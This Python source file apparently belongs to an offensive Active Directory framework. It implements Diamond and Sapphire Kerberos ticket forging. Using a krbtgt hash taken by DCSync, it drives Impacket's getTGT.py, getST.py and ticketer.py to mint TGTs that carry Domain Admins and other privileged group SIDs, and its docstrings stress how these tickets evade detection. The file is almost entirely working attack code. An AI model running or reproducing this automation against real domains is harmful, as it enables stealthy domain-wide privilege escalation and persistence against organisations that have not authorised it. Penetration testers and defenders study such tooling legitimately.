"""Diamond and Sapphire ticket forging handlers.

Diamond Ticket:
    Modify a legitimate TGT's PAC to include privileged group SIDs.
    Harder to detect than Golden Tickets because the TGT was legitimately
    issued by the KDC — only the PAC is modified.

    Requires: krbtgt hash (from DCSync), Impacket ticketer.py or Rubeus.

Sapphire Ticket:
    Use S4U2Self to obtain a service ticket for a privileged user, then
    decrypt and re-encrypt the PAC from that ticket into a new TGT.
    Most evasive form of ticket forging.

    Requires: krbtgt AES key, Impacket.
"""

from __future__ import annotations

import shutil
from datetime import datetime, timezone

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import impacket_wrapper as impacket


@register_handler("DiamondTicket")
class DiamondTicketHandler(BaseEdgeHandler):
    """Forge a Diamond Ticket by modifying a legitimate TGT's PAC.

    Diamond Tickets are harder to detect than Golden Tickets because the
    TGT itself was legitimately issued by the KDC.  Only the PAC is
    modified post-issuance to include privileged group SIDs (e.g. Domain
    Admins, SID 512).

    Attack flow:
        1. Retrieve the krbtgt NT hash from the credential store (obtained
           via a prior DCSync step).
        2. Request a legitimate TGT for the source user via ``getTGT.py``.
        3. Use ``ticketer.py`` to modify the PAC in the TGT, adding the
           Domain Admins group SID (512) and other privileged groups.
        4. Save the modified TGT as a ccache file.
        5. Return the ccache as a new credential.

    Rollback:
        None — ticket manipulation is ephemeral and leaves no persistent
        AD changes.  The forged ticket will expire naturally.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        """Verify krbtgt hash is in credential store and Impacket is available."""
        domain = self._get_domain()

        # Check that Impacket tools are available
        if not shutil.which("getTGT.py"):
            return (
                False,
                "getTGT.py not found on PATH. Ensure Impacket is installed.",
            )
        if not shutil.which("ticketer.py"):
            return (
                False,
                "ticketer.py not found on PATH. Ensure Impacket is installed.",
            )

        # Check for krbtgt hash in credential store (from prior DCSync)
        krbtgt_cred = self.cred_store.get_best_credential("krbtgt", domain)
        if krbtgt_cred is None:
            return (
                False,
                "No krbtgt credential found in the credential store. "
                "A DCSync step must precede Diamond Ticket forging to "
                "obtain the krbtgt NT hash.",
            )

        if krbtgt_cred.cred_type not in (CredentialType.nt_hash, CredentialType.aes_key):
            return (
                False,
                f"krbtgt credential is type '{krbtgt_cred.cred_type}', "
                "but Diamond Ticket forging requires an NT hash or AES key.",
            )

        # Verify we have credentials for the source principal
        principal = self._resolve_principal(edge)
        source_cred = self.cred_store.get_best_credential(principal, domain)
        if source_cred is None:
            cfg = self.config.credentials
            if cfg.username.lower() != principal.lower():
                return (
                    False,
                    f"No credential available for source principal '{principal}'. "
                    "Cannot request a legitimate TGT.",
                )

        return (True, f"Diamond Ticket prerequisites met: krbtgt hash available, source '{principal}' authenticated")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        """Forge a Diamond Ticket by requesting a legitimate TGT and modifying its PAC."""
        principal = self._resolve_principal(edge)
        domain = self._get_domain()
        dc_host = self._get_dc_host()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would request legitimate TGT for '{principal}', "
                f"then modify PAC to include DA group SID 512 using krbtgt hash.",
                [],
            )

        # ---- Step 1: Get krbtgt hash from credential store ----
        krbtgt_cred = self.cred_store.get_best_credential("krbtgt", domain)
        if krbtgt_cred is None:
            return (False, "krbtgt credential not found in store.", [])

        self.logger.info(
            "Step 1/4: Retrieved krbtgt %s from credential store",
            krbtgt_cred.cred_type,
        )

        # ---- Step 2: Request a legitimate TGT for the source user ----
        self.logger.info(
            "Step 2/4: Requesting legitimate TGT for '%s' via getTGT.py",
            principal,
        )
        _target_str, auth_flags = self._get_impacket_auth(principal)

        cred = self.cred_store.get_best_credential(principal, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        tgt_result = await impacket.get_tgt(
            auth_args=auth_flags,
            domain=domain,
            username=principal,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_host,
        )

        if not tgt_result["success"]:
            return (
                False,
                f"Failed to obtain legitimate TGT for '{principal}': "
                f"{tgt_result.get('error', 'unknown')}",
                [],
            )

        self.logger.info("Legitimate TGT obtained for '%s'", principal)

        # ---- Step 3: Modify PAC using ticketer.py ----
        self.logger.info(
            "Step 3/4: Modifying PAC to add DA group SID 512 via ticketer.py",
        )

        # Determine the domain SID from config or edge properties
        domain_sid = edge.properties.get("domain_sid") or self.config.domain.__dict__.get("sid", "")
        if not domain_sid:
            # Attempt to derive from edge target properties
            domain_sid = edge.target.properties.get("domainsid", "")

        nthash = krbtgt_cred.value if krbtgt_cred.cred_type == CredentialType.nt_hash else None
        aes_key = krbtgt_cred.value if krbtgt_cred.cred_type == CredentialType.aes_key else None

        ticketer_result = await impacket.ticketer(
            domain=domain,
            domain_sid=domain_sid,
            nthash=nthash,
            aes_key=aes_key,
            user=principal,
            groups="512,513,518,519,520",
            dc_ip=dc_host,
        )

        if not ticketer_result["success"]:
            return (
                False,
                f"ticketer.py PAC modification failed: "
                f"{ticketer_result.get('error', 'unknown')}",
                [],
            )

        # ---- Step 4: Save modified TGT as ccache credential ----
        ccache_file = f"{principal}.ccache"
        self.logger.info(
            "Step 4/4: Diamond Ticket saved as ccache: %s", ccache_file,
        )

        new_creds = [
            Credential(
                cred_type=CredentialType.ccache,
                value=ccache_file,
                username=principal,
                domain=domain,
                obtained_from=f"DiamondTicket forging (krbtgt {krbtgt_cred.cred_type})",
                obtained_at=datetime.now(timezone.utc),
            )
        ]

        return (
            True,
            f"Diamond Ticket forged for '{principal}' with DA group membership. "
            f"ccache: {ccache_file}",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Ticket manipulation is ephemeral — no AD changes to undo.
        return None


@register_handler("SapphireTicket")
class SapphireTicketHandler(BaseEdgeHandler):
    """Forge a Sapphire Ticket using S4U2Self PAC extraction.

    Sapphire Tickets are the most evasive form of ticket forging.  The
    attack obtains a legitimate service ticket for a privileged user via
    S4U2Self, then decrypts the PAC from that ticket and re-encrypts it
    into a new TGT.  The resulting TGT contains a PAC that was built by
    the real KDC for the target user, making it extremely difficult to
    distinguish from a legitimate ticket.

    Attack flow:
        1. Retrieve the krbtgt AES key from the credential store.
        2. Use S4U2Self (``getST.py -self``) to obtain a service ticket
           for the target DA user, authenticated as the krbtgt/machine account.
        3. Decrypt the PAC from the service ticket using the krbtgt AES key.
        4. Re-encrypt the PAC into a new TGT via ``ticketer.py``.
        5. Save the forged TGT as a ccache file.

    Rollback:
        None — ticket manipulation is ephemeral.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        """Verify krbtgt AES key is available and Impacket is installed."""
        domain = self._get_domain()

        # Check Impacket tools
        if not shutil.which("getST.py"):
            return (
                False,
                "getST.py not found on PATH. Ensure Impacket is installed.",
            )
        if not shutil.which("ticketer.py"):
            return (
                False,
                "ticketer.py not found on PATH. Ensure Impacket is installed.",
            )

        # Sapphire Ticket ideally uses the krbtgt AES key for PAC decryption
        # and re-encryption.  An NT hash can also work but AES is preferred.
        krbtgt_cred = self.cred_store.get_best_credential("krbtgt", domain)
        if krbtgt_cred is None:
            return (
                False,
                "No krbtgt credential found in the credential store. "
                "A DCSync step must precede Sapphire Ticket forging.",
            )

        if krbtgt_cred.cred_type == CredentialType.aes_key:
            self.logger.info("krbtgt AES key available — optimal for Sapphire Ticket")
        elif krbtgt_cred.cred_type == CredentialType.nt_hash:
            self.logger.warning(
                "krbtgt NT hash available but AES key is preferred for "
                "Sapphire Tickets.  Proceeding with NT hash."
            )
        else:
            return (
                False,
                f"krbtgt credential type '{krbtgt_cred.cred_type}' is not "
                "suitable for Sapphire Ticket forging.  Need AES key or NT hash.",
            )

        target_user = self._resolve_target(edge)
        return (
            True,
            f"Sapphire Ticket prerequisites met: krbtgt {krbtgt_cred.cred_type} "
            f"available, target user '{target_user}'",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        """Forge a Sapphire Ticket via S4U2Self PAC extraction and re-encryption."""
        principal = self._resolve_principal(edge)
        target_user = self._resolve_target(edge)
        domain = self._get_domain()
        dc_host = self._get_dc_host()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would use S4U2Self to get service ticket for "
                f"'{target_user}', extract PAC, and re-encrypt into a TGT "
                f"using krbtgt key.",
                [],
            )

        # ---- Step 1: Get krbtgt key from credential store ----
        krbtgt_cred = self.cred_store.get_best_credential("krbtgt", domain)
        if krbtgt_cred is None:
            return (False, "krbtgt credential not found in store.", [])

        self.logger.info(
            "Step 1/4: Retrieved krbtgt %s from credential store",
            krbtgt_cred.cred_type,
        )

        nthash = krbtgt_cred.value if krbtgt_cred.cred_type == CredentialType.nt_hash else None
        aes_key = krbtgt_cred.value if krbtgt_cred.cred_type == CredentialType.aes_key else None

        # ---- Step 2: S4U2Self to get a service ticket for the target DA user ----
        self.logger.info(
            "Step 2/4: Performing S4U2Self to obtain service ticket for '%s'",
            target_user,
        )

        # Build auth for krbtgt-based S4U2Self request
        s4u_auth = impacket.build_impacket_auth(
            domain=domain,
            username="krbtgt",
            nt_hash=nthash,
            aes_key=aes_key,
            dc_ip=dc_host,
        )

        # Use getST.py with -self to perform S4U2Self
        spn = f"krbtgt/{domain}"
        s4u_result = await impacket.get_st(
            spn=spn,
            impersonate=target_user,
            auth_args=s4u_auth,
            domain=domain,
            username="krbtgt",
            nt_hash=nthash,
            dc_ip=dc_host,
            timeout=90,
        )

        if not s4u_result["success"]:
            return (
                False,
                f"S4U2Self failed for '{target_user}': "
                f"{s4u_result.get('error', 'unknown')}",
                [],
            )

        self.logger.info(
            "S4U2Self service ticket obtained for '%s'",
            target_user,
        )

        # ---- Step 3: Decrypt PAC and re-encrypt into TGT via ticketer.py ----
        self.logger.info(
            "Step 3/4: Decrypting PAC and re-encrypting into TGT via ticketer.py",
        )

        domain_sid = edge.properties.get("domain_sid") or self.config.domain.__dict__.get("sid", "")
        if not domain_sid:
            domain_sid = edge.target.properties.get("domainsid", "")

        ticketer_result = await impacket.ticketer(
            domain=domain,
            domain_sid=domain_sid,
            nthash=nthash,
            aes_key=aes_key,
            user=target_user,
            groups="512,513,518,519,520",
            dc_ip=dc_host,
        )

        if not ticketer_result["success"]:
            return (
                False,
                f"ticketer.py Sapphire Ticket creation failed: "
                f"{ticketer_result.get('error', 'unknown')}",
                [],
            )

        # ---- Step 4: Save as ccache credential ----
        ccache_file = f"{target_user}.ccache"
        self.logger.info(
            "Step 4/4: Sapphire Ticket saved as ccache: %s", ccache_file,
        )

        new_creds = [
            Credential(
                cred_type=CredentialType.ccache,
                value=ccache_file,
                username=target_user,
                domain=domain,
                obtained_from=f"SapphireTicket forging (S4U2Self PAC + krbtgt {krbtgt_cred.cred_type})",
                obtained_at=datetime.now(timezone.utc),
            )
        ]

        return (
            True,
            f"Sapphire Ticket forged for '{target_user}' with legitimate KDC-built PAC. "
            f"ccache: {ccache_file}",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Ticket manipulation is ephemeral — no AD changes to undo.
        return None
